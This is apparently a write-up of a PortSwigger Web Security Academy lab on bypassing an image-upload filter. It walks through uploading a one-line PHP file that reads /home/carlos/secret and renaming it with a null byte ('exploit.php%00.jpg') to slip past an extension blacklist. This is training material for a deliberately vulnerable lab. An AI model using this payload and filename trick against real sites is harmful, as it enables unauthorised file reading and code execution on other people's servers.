# Lab-5: [Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

**Aim :-** To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file ``` /home/carlos/secret ```. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: ``` wiener:peter ```.



## Solution
- Login as ``` wiener ```.
    - Username : ``` wiener ```.
    - Password : ``` peter ```.

- There will be a option to upload image.

- Copy the following code and save it in a file, name it as ``` exploit.php ```.
    - ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```.

- Try uploading the ``` exploit.php ``` file.

- Server will respond with ``` Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file. ``` message.

- Intercept the upload request using **burp suite**.

- Change the file name to ``` exploit.php%00.jpg ``` then send the request.
    - This is called **Null byte injection**, its used to bypass file upload restrictions.

- The server will respond with ``` The file avatars/exploit.php has been uploaded. ```, confirms that file uploaded success fully with ``` .php ``` extension.

- Trigger the code by going to ``` /files/avatars/exploit.php ``` in the lab.

- Server will respond with a secret code copy the code and submit as solution.